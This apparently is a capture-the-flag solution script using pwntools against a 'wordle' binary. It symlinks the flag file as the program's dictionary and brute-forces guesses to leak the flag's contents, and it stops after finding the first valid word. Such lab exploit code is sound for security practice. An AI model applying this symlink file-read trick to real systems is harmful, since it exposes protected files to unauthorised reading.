#!/usr/bin/env python3
from pwn import *
import tempfile
import os
import sys
import itertools
import string

# The Wordle word size
WORD_SIZE = 5

# Defines our alphabet
ALPHABET = string.ascii_uppercase + '_{}'

def solve():
    """
        Solves the challenge.
    """

    # Catch exceptions
    try:

        # Container for gathered words
        gathered_words = []
        dictionary_word = None

        # Get the target directory
        assert len(sys.argv) >= 2, Exception('Missing target directory argument')
        target_dir = os.path.abspath(sys.argv[1])
        exe_target_file = os.path.join(target_dir, 'wordle')
        flag_target_file = os.path.join(target_dir, 'flag.txt')
        assert os.path.isfile(exe_target_file), Exception('Target directory does not have the target executable file')
        assert os.path.isfile(flag_target_file), Exception('Target directory does not have the target flag file')
        log.info(f'Target directory is "{target_dir}"')

        # Get the flag size
        flag_size = os.stat(flag_target_file).st_size
        assert flag_size % WORD_SIZE == 0, Exception(f'Flag size {flag_size} must divide in {WORD_SIZE}')
        flag_words = flag_size // WORD_SIZE
        log.info(f'Flag is {flag_size} bytes = {flag_words} words')

        # Create a symlink for executable
        temp_dir = tempfile.mkdtemp()
        exe_symlink_path = os.path.join(temp_dir, 'sym')
        os.symlink(exe_target_file, exe_symlink_path)
        log.info(f'Created symlink for executable at "{exe_symlink_path}"')

        # Create a symlink for the flag
        flag_symlink_path = os.path.join(temp_dir, 'dictionary.txt')
        os.symlink(flag_target_file, flag_symlink_path)
        log.info(f'Created symlink for flag at "{flag_symlink_path}"')

        # Run process
        p = process(exe_symlink_path)

        # Continue until we get enough words
        while len(gathered_words) < flag_words:

            # Receive until we can get the next word
            p.recvuntil(b'Enter your current attempt: ')
            
            # Start guessing until we have at least once dictionary word
            if dictionary_word is None:
                with log.progress('Attempting to get one dictionary word') as pbar:
                    for option in itertools.product(ALPHABET, repeat=WORD_SIZE):
                        candidate = ''.join(option)
                        pbar.status(candidate)
                        p.sendline(candidate.encode())
                        if b'Word is not a dictionary word.' not in p.recvuntil(b'Enter your current attempt: '):
                            dictionary_word = candidate
                            break
                log.info(f'Found dictionary word "{dictionary_word}"')


    # Log exceptions and quit
    except Exception as ex:
        log.error(f'{ex}')

if __name__ == '__main__':
    solve()

